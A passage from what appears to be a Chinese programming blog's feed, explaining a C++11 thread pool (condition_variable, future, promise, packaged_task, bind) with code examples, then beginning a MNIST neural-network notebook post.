class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            task = <span class="built_in">move</span>(m_tasks.<span class="built_in">front</span>());</span><br><span class="line">            m_tasks.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Handle one task&quot;</span>);</span><br><span class="line">        <span class="built_in">task</span>();</span><br><span class="line">        m_idleThreadNum++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-2-实际应用示例"><a href="#2-2-实际应用示例" class="headerlink" title="2.2. 实际应用示例"></a>2.2. 实际应用示例</h2><p>多线程实现从1累加到10000，使用原子变量实现线程同步<br>main.cpp</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author WangYubo</span></span><br><span class="line"><span class="comment"> * @Date 09/17/2018</span></span><br><span class="line"><span class="comment"> * @Description</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;baseInstance.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;threadPool.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;log.hpp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;future&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">testPool</span> : <span class="keyword">public</span> threadPool, <span class="keyword">public</span> BaseInstance&lt;testPool&gt; &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> threadNum)</span> </span>&#123; threadPool::<span class="built_in">init</span>(threadNum, <span class="string">&quot;testPool&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">atomic&lt;<span class="type">int</span>&gt; addNum;</span><br><span class="line">atomic&lt;<span class="type">int</span>&gt; result;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> add = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        add = addNum++;</span><br><span class="line">        <span class="keyword">if</span> (add &gt; <span class="number">10000</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> add;</span><br><span class="line">        &#125;</span><br><span class="line">        result += add;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span> *arg[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    testPool &amp;pool = testPool::<span class="built_in">getInstance</span>();</span><br><span class="line">    pool.<span class="built_in">init</span>(<span class="number">5</span>);</span><br><span class="line">    vector&lt;future&lt;<span class="type">int</span>&gt;&gt; ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">        ret.<span class="built_in">emplace_back</span>(pool.<span class="built_in">commit</span>(test));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;tmp : ret) &#123;</span><br><span class="line">        tmp.<span class="built_in">wait</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;End, result %d&quot;</span>, result.<span class="built_in">load</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="3-详解"><a href="#3-详解" class="headerlink" title="3. 详解"></a>3. 详解</h1><p>乍一看很复杂，但是实现的功能却很强大，支持传入任意参数的任务函数。获取线程结果使用wait函数，充分运用C++11的各种新特性future、atomic（用来不加锁）、condition_variable等。<br>但是这个线程函数不可以传入引用，由于bind的特性，只允许传入指针才可以修改外部变量。传入的参数都将成为值拷贝的形式。</p>
<h2 id="3-1-类的结构"><a href="#3-1-类的结构" class="headerlink" title="3.1. 类的结构"></a>3.1. 类的结构</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">threadPool</span> &#123;</span><br><span class="line">    <span class="keyword">using</span> Task = std::function&lt;<span class="built_in">void</span>(<span class="type">void</span>)&gt;;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span>:</span><br><span class="line">    std::vector&lt;std::thread&gt; m_pool;   <span class="comment">//线程池</span></span><br><span class="line">    std::atomic&lt;<span class="type">int</span>&gt; m_idleThreadNum;  <span class="comment">//空闲线程数量</span></span><br><span class="line">    std::atomic&lt;<span class="type">bool</span>&gt; m_stoped;        <span class="comment">//是否停止线程</span></span><br><span class="line">    std::mutex m_lock;                 <span class="comment">//线程池锁</span></span><br><span class="line">    std::queue&lt;Task&gt; m_tasks;          <span class="comment">//待执行任务</span></span><br><span class="line">    std::condition_variable m_cv;      <span class="comment">//线程控制</span></span><br><span class="line">    <span class="type">int</span> m_threadNum = <span class="number">0</span>;               <span class="comment">//线程总数</span></span><br><span class="line">    std::string m_poolName;            <span class="comment">//线程池名称</span></span><br><span class="line">    <span class="comment">//线程执行函数</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//构造函数</span></span><br><span class="line">    <span class="built_in">threadPool</span>() : <span class="built_in">m_stoped</span>(<span class="literal">true</span>) &#123;&#125;</span><br><span class="line">    ~<span class="built_in">threadPool</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加线程函数</span></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">F</span>, <span class="keyword">class</span>... Args&gt;</span><br><span class="line">    <span class="function"><span class="keyword">auto</span> <span class="title">commit</span><span class="params">(F &amp;&amp;f, Args &amp;&amp;... args)</span> -&gt; std::future&lt;<span class="title">decltype</span><span class="params">(f(args...))</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">using</span> RetType = <span class="keyword">decltype</span>(<span class="built_in">f</span>(args...));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (m_stoped) &#123;</span><br><span class="line">            <span class="keyword">return</span> std::<span class="built_in">future</span>&lt;RetType&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">auto</span> task = std::make_shared&lt;std::packaged_task&lt;<span class="built_in">RetType</span>()&gt;&gt;(</span><br><span class="line">            std::<span class="built_in">bind</span>(std::forward&lt;F&gt;(f), std::forward&lt;Args&gt;(args)...));</span><br><span class="line">        <span class="keyword">auto</span> ret = task-&gt;<span class="built_in">get_future</span>();</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(m_lock)</span></span>;</span><br><span class="line">            m_tasks.<span class="built_in">emplace</span>([task] &#123; (*task)(); &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        m_cv.<span class="built_in">notify_one</span>();</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> threadNum, std::string name = <span class="string">&quot;ThreadPool&quot;</span>)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="参数列表"><a href="#参数列表" class="headerlink" title="参数列表"></a>参数列表</h3><ol>
<li>使用一个vector存放各个线程，这个是真正意义上的池，线程使用c++的thread类</li>
<li>空闲线程数量和是否要停止线程标记，由于操作比较频繁，加锁会造成资源浪费，使用C++的atomic类定义原子变量</li>
<li>线程池的操作肯定是要加锁的，要用mutex。这个锁同时被用于控制线程，和condition_variable联合用。</li>
<li>外部传入的任务分发给线程池来做，这里就需要有一个任务队列，队列自然使用C++的queue，任务使用C++的function类定义一个<code>void xxx(void)</code>函数，为什么这样后面再解析</li>
<li>主要对线程的操作用到了condition_variable类，这里划重点，需要仔细理解，后面详解记得关注</li>
<li>线程总数和线程名字，纯属用来记录使用，内部打印线程池名称和线程数量使用</li>
</ol>
<h3 id="函数列表"><a href="#函数列表" class="headerlink" title="函数列表"></a>函数列表</h3><ol>
<li>构造函数很简单，只初始化了一个m_stoped变量，由于是原子变量，只能在初始化赋值，不能写到定义中。</li>
<li>线程执行函数为内部的<code>void run();</code>，后面会讲解具体实现，这个函数用来给thread类用</li>
<li>commit函数用于传入真正的任务，外部操作线程池主要调用commit函数，传入一个任务函数到线程池<ul>
<li>入参为第一个是函数指针，剩余为可选参数，包括返回类型都由函数指针定义，实现任意函数任意类型的传入和返回。</li>
<li>auto类型的返回在C++11及以前是不支持的，在C++14才允许了auto类型返回值。</li>
<li>当前使用c++11需要在后面加了一个<code>future&lt;decltype(f(args...))&gt;</code>，就是用参数来推断返回值并且转成future类型</li>
<li>使用模板定义F，可以传入任意类型的函数指针，在C++中，函数也认为是一个类</li>
<li>这个定义可以直接实现任意参数和任意返回值的任务函数</li>
<li>模板函数只能在头文件定义，不然编译会报错，所以commit的实现写在了头文件中，具体讲解实现看<a href="#commit_fun">后文</a></li>
</ul>
</li>
</ol>
<h2 id="3-2-用到的C-11新特性详解"><a href="#3-2-用到的C-11新特性详解" class="headerlink" title="3.2. 用到的C++11新特性详解"></a>3.2. 用到的C++11新特性详解</h2><h3 id="thread-线程类"><a href="#thread-线程类" class="headerlink" title="thread 线程类"></a>thread 线程类</h3><ul>
<li>thread是c++11封装的上层线程类，可以直接创建线程</li>
<li>等待线程退出使用<code>join()</code>函数</li>
<li>不调用<code>join()</code>且线程还没有退出时析构<code>thread</code>，将会出现栈溢出</li>
</ul>
<img src = "2020-08-17-01.jpg">

<p>示例</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">th_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;hello thread.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">std::thread <span class="title">t</span><span class="params">(th_func)</span></span>;</span><br><span class="line">    t.<span class="built_in">join</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="mutex-互斥量，用于加锁"><a href="#mutex-互斥量，用于加锁" class="headerlink" title="mutex 互斥量，用于加锁"></a>mutex 互斥量，用于加锁</h3><img src = "2020-08-17-02.jpg">

<ul>
<li>C++提供的互斥量，一般和线程同时用，类似于C语言的pthread_mutex</li>
<li>lock_gard和unique_lock均提供析构时自动解锁，但是unique_lock提供延时加锁等功能，同样时间性能要比lock_guard差点</li>
</ul>
<p>示例</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line">std::mutex my_lock;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> &amp;num, <span class="type">int</span> &amp;sum)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(my_lock)</span></span>;</span><br><span class="line">        <span class="keyword">if</span> (num &gt; <span class="number">100</span>)&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sum += num++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">    std::vector&lt;std::thread&gt; ver;   <span class="comment">//保存线程的vector</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; ++i)&#123;</span><br><span class="line">        std::thread t = std::<span class="built_in">thread</span>(add, std::<span class="built_in">ref</span>(num), std::<span class="built_in">ref</span>(sum));</span><br><span class="line">        ver.<span class="built_in">emplace_back</span>(std::<span class="built_in">move</span>(t)); <span class="comment">//保存线程</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::for_each(ver.<span class="built_in">begin</span>(), ver.<span class="built_in">end</span>(), std::<span class="built_in">mem_fn</span>(&amp;std::thread::join)); <span class="comment">//join</span></span><br><span class="line">    std::cout &lt;&lt; sum &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="condition-variable-条件变量，线程管理主要用到的类"><a href="#condition-variable-条件变量，线程管理主要用到的类" class="headerlink" title="condition_variable 条件变量，线程管理主要用到的类"></a>condition_variable 条件变量，线程管理主要用到的类</h3><ul>
<li><p>condition_variable可以实现一种阻塞线程等待条件满足</p>
</li>
<li><p>当前的用法是</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">threadPool::run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        m_idleThreadNum--;</span><br><span class="line">        Task task;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="function">unique_lock&lt;mutex&gt; <span class="title">lock</span><span class="params">(m_lock)</span></span>;</span><br><span class="line">            m_cv.<span class="built_in">wait</span>(lock, [<span class="keyword">this</span>] &#123; <span class="keyword">return</span> m_stoped || !(m_tasks.<span class="built_in">empty</span>()); &#125;);</span><br><span class="line">            <span class="keyword">if</span> (m_tasks.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            task = <span class="built_in">move</span>(m_tasks.<span class="built_in">front</span>());</span><br><span class="line">            m_tasks.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Handle one task&quot;</span>);</span><br><span class="line">        <span class="built_in">task</span>();</span><br><span class="line">        m_idleThreadNum++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>condition_variable需要和mutex一起用，使用的是mutex的锁特性将线程阻塞。</p>
</li>
<li><p>condition_variable::wait()参数为上述申请的锁，第二个参数可选</p>
<ul>
<li>执行wait后，<font color="red"><strong>前面申请的锁会被释放</strong></font>，当前线程阻塞</li>
</ul>
</li>
<li><p>如果外部使用相同的condition_variable执行notify_one()，将会使一个执行wait阻塞的线程唤醒，并且去申请锁</p>
<ul>
<li>如果执行notify_one()时，锁没有释放，被唤醒的线程还是会阻塞，不过是因为锁没有申请到而阻塞的</li>
</ul>
</li>
<li><p>也就是说执行wait会释放锁，被唤醒后会申请锁</p>
</li>
<li><p>wait第二个参数可选，<font color="red"><strong>在wait()之前</strong></font>会先判断条件是否为true，如果条件为true，不会调用wait，直接进行下面流程</p>
</li>
</ul>
<h3 id="future-未来值获取"><a href="#future-未来值获取" class="headerlink" title="future 未来值获取"></a>future 未来值获取</h3><p><strong>future</strong></p>
<ul>
<li>future主要用于进程中异步获取返回值。提前声明变量，在子线程跑的过程，主进程可以处理其他任务，然后通过future获取子线程的各种值</li>
<li>future一般和promise一起用，future单独用主要用于当做返回值</li>
<li>future在析构时，会自动调用<code>wait()</code></li>
</ul>
<p><strong>promise</strong></p>
<ul>
<li>使用promise需要注意作用域，如果promise析构了，再使用<code>set_value()</code>会引起线程崩溃</li>
<li>一般promise使用是作为线程同步使用</li>
</ul>
<h4 id="1-示例1-等待子进程退出"><a href="#1-示例1-等待子进程退出" class="headerlink" title="1) 示例1 等待子进程退出"></a>1) 示例1 等待子进程退出</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">test1</span><span class="params">(promise&lt;<span class="type">int</span>&gt; &amp;promisObj)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;set promise value&quot;</span>);</span><br><span class="line">	<span class="comment">// promise变量赋值</span></span><br><span class="line">    promisObj.<span class="built_in">set_value</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;return&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span> *arg[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    testPool &amp;pool = testPool::<span class="built_in">getInstance</span>();</span><br><span class="line">    pool.<span class="built_in">init</span>(<span class="number">5</span>);</span><br><span class="line">    vector&lt;future&lt;<span class="type">int</span>&gt;&gt; ret;</span><br><span class="line">    <span class="comment">// 声明promise</span></span><br><span class="line">	promise&lt;<span class="type">int</span>&gt; promisObj;</span><br><span class="line">    <span class="comment">// 起一个线程处理</span></span><br><span class="line">    ret.<span class="built_in">emplace_back</span>(pool.<span class="built_in">commit</span>(test1, <span class="built_in">ref</span>(promisObj)));</span><br><span class="line">    <span class="comment">// 获取future变量</span></span><br><span class="line">	<span class="keyword">auto</span> tmp = promisObj.<span class="built_in">get_future</span>();</span><br><span class="line">	<span class="comment">// 等待变量赋值，这里会阻塞</span></span><br><span class="line">	tmp.<span class="built_in">wait</span>();</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;get data %d&quot;</span>, tmp.<span class="built_in">get</span>());</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;tmp : ret) &#123;</span><br><span class="line">        tmp.<span class="built_in">wait</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>一般promise作为函数输入参数传入，然后调用get_future获取future变量</li>
<li>future变量调用wait会阻塞当前线程，直到promise变量调用了set_value函数赋值，才会返回</li>
<li>future直接调用get也会先调用wait再调用get</li>
<li>future本身可以当做函数返回值传入到线程中，当线程函数返回会赋值future，但是一般需要用到packaged_task来包装线程函数</li>
<li>线程的thread类参数中需要使用ref来传引用，由于线程传入参数是拷贝，隐式使用引用编译会报错，需要使用ref包裹来告诉编译器传入引用</li>
</ul>
<h4 id="2-示例2-异步调用转同步"><a href="#2-示例2-异步调用转同步" class="headerlink" title="2) 示例2 异步调用转同步"></a>2) 示例2 异步调用转同步</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span> *arg[])</span> </span>&#123;</span><br><span class="line">    testPool &amp;pool = testPool::<span class="built_in">getInstance</span>();</span><br><span class="line">    pool.<span class="built_in">init</span>(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">// 声明promise</span></span><br><span class="line">	promise&lt;<span class="type">void</span>&gt; promisObj;</span><br><span class="line">    <span class="type">int</span> testValue;</span><br><span class="line">    <span class="comment">// 起一个线程处理</span></span><br><span class="line">    pool.<span class="built_in">commit</span>([&amp;testValue, &amp;promiseObj]() &#123;</span><br><span class="line">        testValue = <span class="number">1</span>;</span><br><span class="line">        promiseObj.<span class="built_in">set_value</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 等待线程返回</span></span><br><span class="line">    promiseObj.<span class="built_in">get_future</span>().<span class="built_in">wait</span>();</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;testValue %d&quot;</span>, testValue);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="packaged-task"><a href="#packaged-task" class="headerlink" title="packaged_task"></a>packaged_task</h3><ul>
<li>packaged_task是专门给future做包装用的一个类，主要作用是将函数包装成future返回值，传给线程</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//添加线程函数</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">F</span>, <span class="keyword">class</span>... Args&gt;</span><br><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">commit</span><span class="params">(F &amp;&amp;f, Args &amp;&amp;... args)</span> -&gt; std::future&lt;<span class="title">decltype</span><span class="params">(f(args...))</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> RetType = <span class="keyword">decltype</span>(<span class="built_in">f</span>(args...));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (m_stoped) &#123;</span><br><span class="line">        <span class="keyword">return</span> std::<span class="built_in">future</span>&lt;RetType&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> task = std::make_shared&lt;std::packaged_task&lt;<span class="built_in">RetType</span>()&gt;&gt;(</span><br><span class="line">        std::<span class="built_in">bind</span>(std::forward&lt;F&gt;(f), std::forward&lt;Args&gt;(args)...));</span><br><span class="line">    <span class="keyword">auto</span> ret = task-&gt;<span class="built_in">get_future</span>();</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(m_lock)</span></span>;</span><br><span class="line">        m_tasks.<span class="built_in">emplace</span>([task] &#123; (*task)(); &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    m_cv.<span class="built_in">notify_one</span>();</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>上述线程池实现中，将传入的函数外面包装一层packaged_task，类型为外部传入的函数类型</li>
<li>调用get_future()拿到返回值的future类，返回给外层调用，外层调用就可以使用此变量获取到函数返回值</li>
<li>由于返回值已经在调用前获取到了，所以线程函数中真实直接调用task，不需要关心返回值，一般线程创建函数都是没有返回值的，使用此类包装可以方便的把返回值带出去</li>
<li>这里的实现其实是将函数转成packaged_task用于获取future，然后外层包装智能指针，传给lambda表达式，然后整个表达式存放到task的队列中<ul>
<li>lambda表达式，[]中相当于类的成员变量，()省略代表没有参数，内部实现没有返回值，编译时整个lambda表达式就相当于void(void)。符合m_tasks的定义</li>
<li>lambda函数只做一件事情，调用task，task的参数由上面的bind进行绑定，所以调用不需要加参数</li>
</ul>
</li>
</ul>
<h3 id="forward-转移赋值"><a href="#forward-转移赋值" class="headerlink" title="forward 转移赋值"></a>forward 转移赋值</h3><h3 id="bind-绑定函数和参数列表"><a href="#bind-绑定函数和参数列表" class="headerlink" title="bind 绑定函数和参数列表"></a>bind 绑定函数和参数列表</h3><ul>
<li>bind是将函数转换一下参数列表的类。可以调整参数位置，并且绑定参数到制定位置。最后生成一个类似函数指针的可调用对象</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun_2</span><span class="params">(<span class="type">int</span> &amp;a,<span class="type">int</span> &amp;b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a++;</span><br><span class="line">    b++;</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;print a = %d, b = %d&quot;</span>,a, b); 	<span class="comment">// a = 4, b = 3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span> *arg[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    <span class="type">int</span> m = <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">auto</span> f4 = std::<span class="built_in">bind</span>(fun_2, n, placeholders::_1); <span class="comment">//表示绑定fun_2的第一个参数为n, fun_2的第二个参数由调用f4的第一个参数（_1）指定。</span></span><br><span class="line">    <span class="built_in">f4</span>(m);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;m %d&quot;</span>, m);	<span class="comment">// 3</span></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;n %d&quot;</span>, n);	<span class="comment">// 3</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>bind可以调整参数位置，从上述函数可以看出，<code>placeholders::_1</code>将第一个参数放到了第二个位置，n为第一个参数。对于生成的f4函数来说，只需要传入一个参数，会放到第二个位置上。</li>
<li>在线程函数或者网络编程中，通常用回调函数，而C的回调函数一般是固定返回值和参数。使用bind可以很方便传入自己想要的参数。</li>
</ul>
<h2 id="3-3-具体实现函数详解"><a href="#3-3-具体实现函数详解" class="headerlink" title="3.3. 具体实现函数详解"></a>3.3. 具体实现函数详解</h2><ul>
<li>上面各个类的使用详解里面基本将整个线程池给介绍完了</li>
<li>关键点，将task通过bind变成通用的函数类型，使用C++的模板和deltype实现任意函数和参数任务</li>
<li>将传入的函数放到任务队列里面，启用一个线程处理任务。每提交一个任务通知一个线程唤醒，处理任务。</li>
<li>线程通过cv进行控制，没有任务时将会休眠等待外部唤醒处理任务。</li>
</ul>
<h2 id="3-4-实例讲解"><a href="#3-4-实例讲解" class="headerlink" title="3.4. 实例讲解"></a>3.4. 实例讲解</h2><ol>
<li>首先线程池需要是单例，这个毋庸置疑，单例实现参考<a href="/blogs/2018-10-09-objectOrientedStudy/#instance">单例模式</a></li>
</ol>
]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>minst手写数字识别——神经网络实战笔记</title>
    <url>/blogs/2020-05-12-minst/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>神经网络、深度学习理论一片，基本都可以说道一下，但是真的上手搭建一个神经网络，并将数据处理并进行实践就难到我了。这里记录一下数据处理和神经网络实践。算作学习记录，或者说模板，后续搭建神经网络就参考这个博客，提供学习模板</p>
<p>这里做的是minst手写数字识别的数据集，数据和代码来源主要来自kaggle</p>
<h1 id="二、正文"><a href="#二、正文" class="headerlink" title="二、正文"></a>二、正文</h1><h2 id="1-数据处理部分"><a href="#1-数据处理部分" class="headerlink" title="1. 数据处理部分"></a>1. 数据处理部分</h2><p>先看目录结构有啥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np <span class="comment"># linear algebra</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd <span class="comment"># data processing, CSV file I/O (e.g. pd.read_csv)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> dirname, _, filenames <span class="keyword">in</span> os.walk(<span class="string">&#x27;/kaggle/input&#x27;</span>):</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">        <span class="built_in">print</span>(os.path.join(dirname, filename))</span><br></pre></td></tr></table></figure>

